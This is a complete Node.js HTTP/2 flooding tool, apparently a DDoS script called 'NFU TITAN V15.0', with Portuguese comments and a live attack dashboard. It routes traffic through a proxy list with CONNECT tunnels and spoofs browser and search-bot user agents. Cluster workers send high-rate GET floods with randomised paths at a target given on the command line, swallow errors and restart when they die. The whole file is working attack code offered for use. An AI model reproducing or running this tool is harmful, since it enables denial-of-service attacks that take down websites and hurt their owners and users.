const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const crypto = require("crypto");
const fs = require("fs");
const url = require("url");
const dns = require("dns");
const os = require("os");

// ==============================================
// CONFIGURAÇÕES DE ATAQUE OTIMIZADAS
// ==============================================
const ATTACK_CONFIG = {
    MAX_RETRIES: 2,
    CONNECTION_TIMEOUT: 10000,
    RESPONSE_TIMEOUT: 30000,
    INITIAL_WINDOW_SIZE: 1073741824,
    MAX_CONCURRENT_STREAMS: 1000,
    SESSION_DURATION: 15000,
    BATCH_SIZE: 50,
    RATE_INTERVAL: 100,
    PING_INTERVAL: 5000
};

// User Agents
const USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/120.0.0.0 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/118.0.5993.117 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
];

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

// ==============================================
// PARSE ARGUMENTOS
// ==============================================
const args = { 
    target: process.argv[2], 
    time: parseInt(process.argv[3]) || 60, 
    rate: parseInt(process.argv[4]) || 100, 
    threads: parseInt(process.argv[5]) || 4,
    proxyFile: process.argv[6] || "proxy.txt"
};

const parsedTarget = url.parse(args.target);
let proxies = [];
let proxyIndex = 0;

// Carregar proxies
try {
    const proxyContent = fs.readFileSync(args.proxyFile, "utf-8");
    proxies = proxyContent.split(/\r?\n/).filter(l => l.length > 5 && l.includes(':'));
    console.log(`\x1b[1;32m[+] Carregados ${proxies.length} proxies\x1b[0m`);
} catch (err) {
    console.log(`\x1b[1;31m[-] Erro ao carregar proxies: ${err.message}\x1b[0m`);
    process.exit(1);
}

const PROXY_COUNT = proxies.length;

// ==============================================
// FUNÇÕES AUXILIARES
// ==============================================
function format(n) {
    if (n >= 1e9) return (n / 1e9).toFixed(2) + 'B';
    if (n >= 1e6) return (n / 1e6).toFixed(2) + 'M';
    if (n >= 1e3) return (n / 1e3).toFixed(2) + 'K';
    return n.toString();
}

function randomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomPath() {
    const paths = ['/', '/api', '/v1', '/static', '/assets', '/images', '/css', '/js', '/wp-admin', '/login', '/auth'];
    return paths[Math.floor(Math.random() * paths.length)] + '?' + crypto.randomBytes(8).toString('hex');
}

function randomHeaders() {
    return {
        "user-agent": USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)],
        "accept": "*/*",
        "accept-language": "pt-BR,pt;q=0.9,en;q=0.8",
        "accept-encoding": "gzip, deflate, br",
        "cache-control": "no-cache",
        "pragma": "no-cache",
        "sec-ch-ua": '"Not A(Brand";v="99", "Chromium";v="120"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "none",
        "upgrade-insecure-requests": "1"
    };
}

// ==============================================
// MASTER PROCESS
// ==============================================
if (cluster.isMaster) {
    let totalSent = 0, rps = 0, startTime = Date.now();
    const codes = {}, online = new Set(), proxyHits = {};
    let targetIp = "Resolving...";

    dns.lookup(parsedTarget.hostname, (err, addr) => { 
        if (!err) targetIp = addr;
    });

    // Fork workers
    for (let i = 0; i < args.threads; i++) {
        cluster.fork();
    }

    // Status update interval
    setInterval(() => {
        const elapsed = (Date.now() - startTime) / 1000;
        const avgRps = elapsed > 0 ? totalSent / elapsed : 0;
        
        console.clear();
        console.log(`\x1b[1;37m╔════════════════════════════════════════════════════════════════════════════════════╗\x1b[0m`);
        console.log(`\x1b[1;37m║\x1b[41m                     NFU TITAN V15.0 - ULTRA POWER MODE                        \x1b[0m\x1b[1;37m║\x1b[0m`);
        console.log(`\x1b[1;37m╠════════════════════════════════════════════════════════════════════════════════════╣\x1b[0m`);
        console.log(`\x1b[1;37m║\x1b[1;36m TOTAL SENT:\x1b[1;32m ${format(totalSent).padEnd(18)}\x1b[1;37m│\x1b[1;36m CURRENT RPS:\x1b[1;32m ${format(rps).padEnd(14)}\x1b[1;37m│\x1b[1;36m AVG RPS:\x1b[1;32m ${format(avgRps).padEnd(14)}\x1b[1;37m║\x1b[0m`);
        console.log(`\x1b[1;37m║\x1b[1;36m TARGET:\x1b[1;33m ${parsedTarget.host.padEnd(25)}\x1b[1;37m│\x1b[1;36m IP:\x1b[1;33m ${targetIp.padEnd(20)}\x1b[1;37m│\x1b[1;36m PROXIES:\x1b[1;33m ${online.size}/${PROXY_COUNT}\x1b[1;37m║\x1b[0m`);
        console.log(`\x1b[1;37m╠════════════════════════════════════════════════════════════════════════════════════╣\x1b[0m`);
        
        const statusEntries = Object.entries(codes).sort((a,b) => b[1]-a[1]).slice(0, 4);
        const statusLine = statusEntries.map(([c,v]) => {
            let color = c.startsWith('2') ? '\x1b[1;32m' : (c.startsWith('3') ? '\x1b[1;33m' : '\x1b[1;31m');
            return `${color}${c}\x1b[1;37m:${format(v)}`;
        }).join(' \x1b[1;30m│\x1b[0m ');
        
        console.log(`\x1b[1;37m║\x1b[1;36m STATUS:\x1b[1;37m ${statusLine || 'Aguardando...'}\x1b[0m${' '.repeat(Math.max(0, 85 - (statusLine?.length || 15)))}\x1b[1;37m║\x1b[0m`);
        console.log(`\x1b[1;37m╠════════════════════════════════════════════════════════════════════════════════════╣\x1b[0m`);
        
        // Top proxies
        const topProxies = Object.entries(proxyHits).sort((a,b) => b[1]-a[1]).slice(0, 3);
        if (topProxies.length > 0) {
            console.log(`\x1b[1;37m║\x1b[1;35m TOP PROXIES:\x1b[0m${' '.repeat(73)}\x1b[1;37m║\x1b[0m`);
            topProxies.forEach(([ip, count], idx) => {
                console.log(`\x1b[1;37m║   \x1b[1;30m${idx+1}.\x1b[1;33m ${ip.padEnd(22)}\x1b[1;30m─\x1b[1;32m ${format(count).padEnd(10)}\x1b[1;37m${' '.repeat(52)}\x1b[1;37m║\x1b[0m`);
            });
            console.log(`\x1b[1;37m╠════════════════════════════════════════════════════════════════════════════════════╣\x1b[0m`);
        }
        
        console.log(`\x1b[1;37m║\x1b[1;36m WORKERS:\x1b[1;33m ${args.threads}\x1b[1;37m${' '.repeat(75)}\x1b[1;37m║\x1b[0m`);
        console.log(`\x1b[1;37m╚════════════════════════════════════════════════════════════════════════════════════╝\x1b[0m`);
        
        rps = 0;
    }, 1000);

    cluster.on('message', (worker, msg) => {
        if (msg.type === 'batch') {
            totalSent += msg.c; 
            rps += msg.c;
            if (msg.ip) {
                online.add(msg.ip);
                proxyHits[msg.ip] = (proxyHits[msg.ip] || 0) + msg.c;
            }
            if (msg.codes) {
                Object.keys(msg.codes).forEach(c => { codes[c] = (codes[c] || 0) + msg.codes[c]; });
            }
        }
    });
    
    setTimeout(() => {
        console.log(`\x1b[1;33m\n[*] Ataque finalizado! Total enviado: ${format(totalSent)}\x1b[0m`);
        process.exit(1);
    }, args.time * 1000);
    
    cluster.on('exit', (worker) => {
        cluster.fork();
    });
    
} else {
    // ==============================================
    // WORKER PROCESS
    // ==============================================
    
    const workerRate = Math.max(5, Math.floor(args.rate / args.threads));
    
    function runFlooder() {
        if (proxies.length === 0) {
            setTimeout(runFlooder, 1000);
            return;
        }
        
        const proxyRaw = proxies[Math.floor(Math.random() * proxies.length)];
        if (!proxyRaw) {
            setTimeout(runFlooder, 100);
            return;
        }
        
        const [pHost, pPort] = proxyRaw.split(':');
        if (!pHost || !pPort) {
            setTimeout(runFlooder, 100);
            return;
        }
        
        let attempts = 0;
        let batchCount = 0;
        let batchCodes = {};
        
        const connectToProxy = () => {
            attempts++;
            if (attempts > ATTACK_CONFIG.MAX_RETRIES) {
                setTimeout(runFlooder, 500);
                return;
            }
            
            const socket = net.createConnection({ host: pHost, port: parseInt(pPort) });
            socket.setTimeout(ATTACK_CONFIG.CONNECTION_TIMEOUT);
            
            socket.once("connect", () => {
                socket.write(`CONNECT ${parsedTarget.host}:443 HTTP/1.1\r\nHost: ${parsedTarget.host}:443\r\n\r\n`);
            });

            socket.once("data", (data) => {
                const response = data.toString();
                if (!response.includes("200") && !response.includes("Connection established")) {
                    socket.destroy();
                    setTimeout(connectToProxy, 1000);
                    return;
                }
                
                const tlsConn = tls.connect({
                    socket: socket,
                    servername: parsedTarget.host,
                    ALPNProtocols: ["h2"],
                    rejectUnauthorized: false
                });
                
                tlsConn.once("secureConnect", () => {
                    const client = http2.connect(parsedTarget.href, {
                        createConnection: () => tlsConn,
                        settings: { 
                            initialWindowSize: ATTACK_CONFIG.INITIAL_WINDOW_SIZE,
                            maxConcurrentStreams: ATTACK_CONFIG.MAX_CONCURRENT_STREAMS,
                            enablePush: false
                        }
                    });
                    
                    const sendRequests = () => {
                        if (!client || client.destroyed) return;
                        
                        for (let i = 0; i < workerRate; i++) {
                            const headers = randomHeaders();
                            headers[":method"] = "GET";
                            headers[":path"] = randomPath();
                            headers[":scheme"] = "https";
                            headers[":authority"] = parsedTarget.host;
                            
                            const req = client.request(headers);
                            
                            req.on("response", (res) => {
                                const sc = res[":status"];
                                batchCount++;
                                batchCodes[sc] = (batchCodes[sc] || 0) + 1;
                                
                                if (batchCount >= ATTACK_CONFIG.BATCH_SIZE) {
                                    process.send({ type: 'batch', c: batchCount, codes: batchCodes, ip: pHost });
                                    batchCount = 0;
                                    batchCodes = {};
                                }
                            });
                            
                            req.on('error', () => {
                                req.close();
                                req.destroy();
                            });
                            
                            req.end();
                        }
                    };
                    
                    client.on("connect", () => {
                        const floodInterval = setInterval(() => {
                            if (!client || client.destroyed) {
                                clearInterval(floodInterval);
                                return;
                            }
                            sendRequests();
                        }, ATTACK_CONFIG.RATE_INTERVAL);
                        
                        setTimeout(() => {
                            clearInterval(floodInterval);
                            client.destroy();
                            socket.destroy();
                            setTimeout(runFlooder, 100);
                        }, ATTACK_CONFIG.SESSION_DURATION);
                    });
                    
                    client.on("error", () => {
                        socket.destroy();
                        setTimeout(runFlooder, 500);
                    });
                });
                
                tlsConn.on("error", () => {
                    socket.destroy();
                    setTimeout(runFlooder, 500);
                });
            });
            
            socket.on("error", () => {
                socket.destroy();
                setTimeout(connectToProxy, 500);
            });
            
            socket.on("timeout", () => {
                socket.destroy();
                setTimeout(connectToProxy, 500);
            });
        };
        
        connectToProxy();
    }
    
    // Iniciar múltiplos flooders por worker
    for (let i = 0; i < 4; i++) {
        setTimeout(() => runFlooder(), i * 100);
    }
}
